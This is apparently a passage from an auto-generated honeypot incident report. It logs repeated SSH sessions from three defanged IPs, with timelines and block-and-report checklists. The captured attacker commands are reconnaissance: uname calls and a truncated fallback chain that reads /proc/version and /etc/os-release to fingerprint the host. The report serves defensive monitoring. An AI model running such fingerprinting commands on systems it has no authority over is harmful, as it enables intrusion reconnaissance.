|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:26 |
| **Last Seen** | 2026-09-25 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:26:53` | `cowrie.session.connect` |
| `2026-09-25 18:26:53` | `cowrie.client.version` |
| `2026-09-25 18:26:54` | `cowrie.client.kex` |
| `2026-09-25 18:26:54` | `cowrie.login.success` |
| `2026-09-25 18:26:55` | `cowrie.session.params` |
| `2026-09-25 18:26:55` | `cowrie.command.input` |
| `2026-09-25 18:26:55` | `cowrie.log.closed` |
| `2026-09-25 18:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ba1fd0a789

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:28 |
| **Last Seen** | 2026-09-25 18:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:28:02` | `cowrie.session.connect` |
| `2026-09-25 18:28:02` | `cowrie.client.version` |
| `2026-09-25 18:28:02` | `cowrie.client.kex` |
| `2026-09-25 18:28:04` | `cowrie.login.success` |
| `2026-09-25 18:28:06` | `cowrie.session.params` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.success` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:06` | `cowrie.command.input` |
| `2026-09-25 18:28:07` | `cowrie.log.closed` |
| `2026-09-25 18:28:08` | `cowrie.session.params` |
| `2026-09-25 18:28:08` | `cowrie.command.input` |
| `2026-09-25 18:28:09` | `cowrie.log.closed` |
| `2026-09-25 18:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69ba91585af

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:28 |
| **Last Seen** | 2026-09-25 18:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:28:41` | `cowrie.session.connect` |
| `2026-09-25 18:28:41` | `cowrie.client.version` |
| `2026-09-25 18:28:42` | `cowrie.client.kex` |
| `2026-09-25 18:28:42` | `cowrie.login.success` |
| `2026-09-25 18:28:43` | `cowrie.session.params` |
| `2026-09-25 18:28:43` | `cowrie.command.input` |
| `2026-09-25 18:28:43` | `cowrie.log.closed` |
| `2026-09-25 18:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e9135590ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:29 |
| **Last Seen** | 2026-09-25 18:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:29:51` | `cowrie.session.connect` |
| `2026-09-25 18:29:51` | `cowrie.client.version` |
| `2026-09-25 18:29:51` | `cowrie.client.kex` |
| `2026-09-25 18:29:53` | `cowrie.login.success` |
| `2026-09-25 18:29:55` | `cowrie.session.params` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.success` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.command.input` |
| `2026-09-25 18:29:55` | `cowrie.log.closed` |
| `2026-09-25 18:29:57` | `cowrie.session.params` |
| `2026-09-25 18:29:57` | `cowrie.command.input` |
| `2026-09-25 18:29:57` | `cowrie.log.closed` |
| `2026-09-25 18:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36840ba567f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:30 |
| **Last Seen** | 2026-09-25 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:30:26` | `cowrie.session.connect` |
| `2026-09-25 18:30:26` | `cowrie.client.version` |
| `2026-09-25 18:30:26` | `cowrie.client.kex` |
| `2026-09-25 18:30:27` | `cowrie.login.success` |
| `2026-09-25 18:30:28` | `cowrie.session.params` |
| `2026-09-25 18:30:28` | `cowrie.command.input` |
| `2026-09-25 18:30:28` | `cowrie.log.closed` |
| `2026-09-25 18:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da65bec0c42c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:32 |
| **Last Seen** | 2026-09-25 18:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:32:05` | `cowrie.session.connect` |
| `2026-09-25 18:32:05` | `cowrie.client.version` |
| `2026-09-25 18:32:05` | `cowrie.client.kex` |
| `2026-09-25 18:32:06` | `cowrie.login.success` |
| `2026-09-25 18:32:07` | `cowrie.session.params` |
| `2026-09-25 18:32:07` | `cowrie.command.input` |
| `2026-09-25 18:32:07` | `cowrie.log.closed` |
| `2026-09-25 18:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99997b2b02ed

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:33 |
| **Last Seen** | 2026-09-25 18:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:33:28` | `cowrie.session.connect` |
| `2026-09-25 18:33:28` | `cowrie.client.version` |
| `2026-09-25 18:33:28` | `cowrie.client.kex` |
| `2026-09-25 18:33:29` | `cowrie.login.success` |
| `2026-09-25 18:33:31` | `cowrie.session.params` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.success` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.command.input` |
| `2026-09-25 18:33:31` | `cowrie.log.closed` |
| `2026-09-25 18:33:33` | `cowrie.session.params` |
| `2026-09-25 18:33:33` | `cowrie.command.input` |
| `2026-09-25 18:33:33` | `cowrie.log.closed` |
| `2026-09-25 18:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5573fac675dc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:33 |
| **Last Seen** | 2026-09-25 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:33:46` | `cowrie.session.connect` |
| `2026-09-25 18:33:46` | `cowrie.client.version` |
| `2026-09-25 18:33:46` | `cowrie.client.kex` |
| `2026-09-25 18:33:47` | `cowrie.login.success` |
| `2026-09-25 18:33:47` | `cowrie.session.params` |
| `2026-09-25 18:33:47` | `cowrie.command.input` |
| `2026-09-25 18:33:48` | `cowrie.log.closed` |
| `2026-09-25 18:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd01a7ab0ac2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:35 |
| **Last Seen** | 2026-09-25 18:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:35:18` | `cowrie.session.connect` |
| `2026-09-25 18:35:18` | `cowrie.client.version` |
| `2026-09-25 18:35:18` | `cowrie.client.kex` |
| `2026-09-25 18:35:20` | `cowrie.login.success` |
| `2026-09-25 18:35:21` | `cowrie.session.params` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.success` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:21` | `cowrie.command.input` |
| `2026-09-25 18:35:22` | `cowrie.log.closed` |
| `2026-09-25 18:35:23` | `cowrie.session.params` |
| `2026-09-25 18:35:23` | `cowrie.command.input` |
| `2026-09-25 18:35:23` | `cowrie.log.closed` |
| `2026-09-25 18:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53750745fd15

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:35 |
| **Last Seen** | 2026-09-25 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:35:27` | `cowrie.session.connect` |
| `2026-09-25 18:35:27` | `cowrie.client.version` |
| `2026-09-25 18:35:27` | `cowrie.client.kex` |
| `2026-09-25 18:35:28` | `cowrie.login.success` |
| `2026-09-25 18:35:28` | `cowrie.session.params` |
| `2026-09-25 18:35:28` | `cowrie.command.input` |
| `2026-09-25 18:35:28` | `cowrie.log.closed` |
| `2026-09-25 18:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3bcc795dbf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:37 |
| **Last Seen** | 2026-09-25 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:37:05` | `cowrie.session.connect` |
| `2026-09-25 18:37:05` | `cowrie.client.version` |
| `2026-09-25 18:37:05` | `cowrie.client.kex` |
| `2026-09-25 18:37:05` | `cowrie.login.success` |
| `2026-09-25 18:37:06` | `cowrie.session.params` |
| `2026-09-25 18:37:06` | `cowrie.command.input` |
| `2026-09-25 18:37:06` | `cowrie.log.closed` |
| `2026-09-25 18:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2037dd368893

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:37 |
| **Last Seen** | 2026-09-25 18:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:37:09` | `cowrie.session.connect` |
| `2026-09-25 18:37:09` | `cowrie.client.version` |
| `2026-09-25 18:37:09` | `cowrie.client.kex` |
| `2026-09-25 18:37:11` | `cowrie.login.success` |
| `2026-09-25 18:37:12` | `cowrie.session.params` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.success` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.command.input` |
| `2026-09-25 18:37:12` | `cowrie.log.closed` |
| `2026-09-25 18:37:14` | `cowrie.session.params` |
| `2026-09-25 18:37:14` | `cowrie.command.input` |
| `2026-09-25 18:37:14` | `cowrie.log.closed` |
| `2026-09-25 18:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b72a25e0018

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]104` |
| **First Seen** | 2026-09-25 18:37 |
| **Last Seen** | 2026-09-25 18:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:37:40` | `cowrie.session.connect` |
| `2026-09-25 18:37:40` | `cowrie.login.success` |
| `2026-09-25 18:37:40` | `cowrie.session.params` |
| `2026-09-25 18:37:58` | `cowrie.log.closed` |
| `2026-09-25 18:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]104` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ebae2aa39ef

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]104` |
| **First Seen** | 2026-09-25 18:38 |
| **Last Seen** | 2026-09-25 18:38 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:38:16` | `cowrie.session.connect` |
| `2026-09-25 18:38:16` | `cowrie.login.success` |
| `2026-09-25 18:38:17` | `cowrie.session.params` |
| `2026-09-25 18:38:17` | `cowrie.command.input` |
| `2026-09-25 18:38:17` | `cowrie.command.failed` |
| `2026-09-25 18:38:17` | `cowrie.command.input` |
| `2026-09-25 18:38:17` | `cowrie.command.input` |
| `2026-09-25 18:38:35` | `cowrie.log.closed` |
| `2026-09-25 18:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]104` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb0d1e29c28

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]104` |
| **First Seen** | 2026-09-25 18:38 |
| **Last Seen** | 2026-09-25 18:38 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:38:35` | `cowrie.session.connect` |
| `2026-09-25 18:38:35` | `cowrie.login.success` |
| `2026-09-25 18:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]104` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c12ec90872c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:38 |
| **Last Seen** | 2026-09-25 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:38:41` | `cowrie.session.connect` |
| `2026-09-25 18:38:41` | `cowrie.client.version` |
| `2026-09-25 18:38:41` | `cowrie.client.kex` |
| `2026-09-25 18:38:41` | `cowrie.login.success` |
| `2026-09-25 18:38:42` | `cowrie.session.params` |
| `2026-09-25 18:38:42` | `cowrie.command.input` |
| `2026-09-25 18:38:42` | `cowrie.log.closed` |
| `2026-09-25 18:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa74931e004d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:39 |
| **Last Seen** | 2026-09-25 18:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:39:04` | `cowrie.session.connect` |
| `2026-09-25 18:39:04` | `cowrie.client.version` |
| `2026-09-25 18:39:04` | `cowrie.client.kex` |
| `2026-09-25 18:39:06` | `cowrie.login.success` |
| `2026-09-25 18:39:07` | `cowrie.session.params` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.success` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.command.input` |
| `2026-09-25 18:39:07` | `cowrie.log.closed` |
| `2026-09-25 18:39:08` | `cowrie.session.params` |
| `2026-09-25 18:39:08` | `cowrie.command.input` |
| `2026-09-25 18:39:09` | `cowrie.log.closed` |
| `2026-09-25 18:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534365b6caf5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:41 |
| **Last Seen** | 2026-09-25 18:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:41:03` | `cowrie.session.connect` |
| `2026-09-25 18:41:03` | `cowrie.client.version` |
| `2026-09-25 18:41:03` | `cowrie.client.kex` |
| `2026-09-25 18:41:04` | `cowrie.login.success` |
| `2026-09-25 18:41:06` | `cowrie.session.params` |
